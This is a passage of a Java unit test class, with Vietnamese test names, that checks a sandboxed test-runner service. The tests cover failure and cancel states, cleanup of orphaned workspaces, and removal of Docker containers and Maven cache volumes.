        byte[] archive = new com.greytest.service.UnitTestFileService().createEmptySandboxArchive();
        when(units.exportArchive(any(), any())).thenReturn(new UnitTestService.ExportArchive(archive, List.of()));

        Project project = new Project();
        project.setId(101L);
        project.setStoragePath(tempDir.toString());
        when(projects.findById(101L)).thenReturn(Optional.of(project));

        SandboxTestRunService service = new SandboxTestRunService(
                units, projects, coverage, jobs, javaVersions,
                Runnable::run,
                (args, log) -> args.get(0).equals("exec") && !args.contains("cp") ? new SandboxTestRunService.Result(-1) : new SandboxTestRunService.Result(0));

        service.start(101L, null);
        var state = service.state(101L);
        assertThat(state.status()).isEqualTo(SandboxTestRunService.Status.FAILED);
        assertThat(state.message()).containsAnyOf("quá thời gian", "thất bại");
    }

    @Test
    @DisplayName("Phase 3.3 - 5: Job bị hủy thì container và dữ liệu tạm được cleanup")
    void testCancelledJobCleaned() {
        UnitTestService units = mock(UnitTestService.class);
        ProjectRepository projects = mock(ProjectRepository.class);
        CoverageService coverage = mock(CoverageService.class);
        GenerationJobService jobs = mock(GenerationJobService.class);
        ProjectJavaVersionDetector javaVersions = mock(ProjectJavaVersionDetector.class);

        SandboxTestRunService service = new SandboxTestRunService(
                units, projects, coverage, jobs, javaVersions,
                runnable -> {},
                (args, log) -> new SandboxTestRunService.Result(0));

        service.cancel(101L);
        var state = service.state(101L);
        assertThat(state.status()).isEqualTo(SandboxTestRunService.Status.FAILED);
        assertThat(state.message()).contains("hủy");
    }

    @Test
    @DisplayName("Phase 3.3 - 6: Backend restart quét sạch workspace mồ côi cũ")
    void testStartupRecoveryCleansOrphanedResources(@TempDir Path tempDir) throws Exception {
        Path orphanedDir1 = tempDir.resolve("workspaces").resolve("ws-101-orphan1");
        Path orphanedDir2 = tempDir.resolve("workspaces").resolve("ws-202-orphan2");
        Files.createDirectories(orphanedDir1);
        Files.createDirectories(orphanedDir2);
        Files.writeString(orphanedDir1.resolve("leak.txt"), "leftover");
        Files.writeString(orphanedDir2.resolve("leak.txt"), "leftover");

        StorageWorkspaceService service = new StorageWorkspaceService(
                tempDir.toString(), mock(StorageEncryptionService.class), mock(ProjectRepository.class));
        service.cleanupLeftoverWorkspaces();

        assertThat(Files.exists(orphanedDir1)).isFalse();
        assertThat(Files.exists(orphanedDir2)).isFalse();
    }

    @Test
    @DisplayName("Phase 3.3 - 7: Docker container bị xóa không để lại anonymous volume")
    void testLiveDockerContainerRemovalDeletesAnonymousVolume() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        String container = "greytest-vol-clean-" + UUID.randomUUID();
        String volName = null;
        try {
            runDockerCmd(List.of("create", "--name", container, "-v", "/work", "alpine", "sleep", "10"));
            String inspect = runDockerCmd(List.of("inspect", container, "--format", "{{range .Mounts}}{{.Name}}{{end}}")).trim();
            assertThat(inspect).isNotBlank();
            volName = inspect;

            String inspectVol = runDockerCmd(List.of("volume", "inspect", volName));
            assertThat(inspectVol).contains(volName);

            runDockerCmd(List.of("rm", "-f", "-v", container));

            String inspectVolAfter = runDockerCmd(List.of("volume", "inspect", volName));
            assertThat(inspectVolAfter).containsAnyOf("no such volume", "Error");
            volName = null;
        } finally {
            if (volName != null) {
                runDockerCmd(List.of("volume", "rm", "-f", volName));
            }
            runDockerCmd(List.of("rm", "-f", "-v", container));
        }
    }

    @Test
    @DisplayName("Phase 3.3 - 8: Project deletion xử lý đúng per-project Maven cache")
    void testLiveProjectDeletionCleansMavenCacheVolume() throws Exception {
        Assumptions.assumeTrue(isSandboxImageAvailable(), "Docker daemon hoặc image greytest-sandbox:17 chưa sẵn sàng");

        long dummyProjectId = 998877L;
        String cacheVolume = "greytest_sandbox_m2_p" + dummyProjectId;
        try {
            runDockerCmd(List.of("volume", "create", cacheVolume));
            String inspectBefore = runDockerCmd(List.of("volume", "inspect", cacheVolume));
            assertThat(inspectBefore).contains(cacheVolume);

            UnitTestService units = mock(UnitTestService.class);
            ProjectRepository projects = mock(ProjectRepository.class);
            CoverageService coverage = mock(CoverageService.class);
            GenerationJobService jobs = mock(GenerationJobService.class);
            ProjectJavaVersionDetector javaVersions = mock(ProjectJavaVersionDetector.class);

            SandboxTestRunService service = new SandboxTestRunService(
                    units, projects, coverage, jobs, javaVersions,
                    runnable -> {},
                    (args, log) -> new SandboxTestRunService.Result(0));

            service.cleanupProjectResources(dummyProjectId);

            String inspectAfter = runDockerCmd(List.of("volume", "inspect", cacheVolume));
            assertThat(inspectAfter).containsAnyOf("no such volume", "Error");
        } finally {
            runDockerCmd(List.of("volume", "rm", "-f", cacheVolume));
        }
    }

    @Test
    @DisplayName("Phase 3.3 - 9: Audit log không chứa source code hoặc test code")
    void testNoSourceCodeInLogs() {
        SandboxTestRunService.recordSecurityAudit("TEST_EXECUTION_STARTED", 101L, "greytest-run-sample",
                SandboxTestRunService.NETWORK_NONE, "RUNNING", 100, "Bắt đầu chạy test trong sandbox");
        assertThat(SandboxTestRunService.NETWORK_NONE).isEqualTo("none");
    }

    @Test
    @DisplayName("Phase 3.3 - 10: Không còn plaintext workspace sau khi recovery")
    void testNoPlaintextWorkspacesAfterRecovery(@TempDir Path tempDir) throws Exception {
        Path wsRoot = tempDir.resolve("workspaces");
        Files.createDirectories(wsRoot.resolve("ws-999-old"));
        Files.writeString(wsRoot.resolve("ws-999-old/Sample.java"), "public class Sample {}");

        StorageWorkspaceService service = new StorageWorkspaceService(tempDir.toString(), mock(StorageEncryptionService.class), mock(ProjectRepository.class));
        service.cleanupLeftoverWorkspaces();

        assertThat(Files.exists(wsRoot.resolve("ws-999-old"))).isFalse();
    }

    @Test
    @DisplayName("Phase 3.3 - 11: Cleanup an toàn và không gây crash khi gặp lỗi ngoại lệ")
    void testCleanupFailureResilience() {
        UnitTestService units = mock(UnitTestService.class);
        ProjectRepository projects = mock(ProjectRepository.class);
        CoverageService coverage = mock(CoverageService.class);
        GenerationJobService jobs = mock(GenerationJobService.class);
        ProjectJavaVersionDetector javaVersions = mock(ProjectJavaVersionDetector.class);

        SandboxTestRunService service = new SandboxTestRunService(
                units, projects, coverage, jobs, javaVersions,
                runnable -> {},
                (args, log) -> new SandboxTestRunService.Result(0));

        service.cancel(null);
        service.cancel(999999L);
        service.cleanupProjectResources(null);
        service.cleanupProjectResources(999999L);
    }

    @Test
    @DisplayName("Phase 3.3 - 12: Cleanup một project không làm hỏng dữ liệu project khác")
    void testCleanupPreservesOtherProjects(@TempDir Path tempDir) throws Exception {
        Path wsRoot = tempDir.resolve("workspaces");
        Path p1ws = wsRoot.resolve("ws-101-active");
        Path p2ws = wsRoot.resolve("ws-202-active");
        Files.createDirectories(p1ws);
        Files.createDirectories(p2ws);
        Files.writeString(p1ws.resolve("P1.java"), "class P1 {}");
        Files.writeString(p2ws.resolve("P2.java"), "class P2 {}");

        StorageWorkspaceService service = new StorageWorkspaceService(tempDir.toString(), mock(StorageEncryptionService.class), mock(ProjectRepository.class));
        service.cleanupProjectWorkspaces(101L);

        assertThat(Files.exists(p1ws)).isFalse();
        assertThat(Files.exists(p2ws)).isTrue();
        assertThat(Files.readString(p2ws.resolve("P2.java"))).isEqualTo("class P2 {}");
    }
}
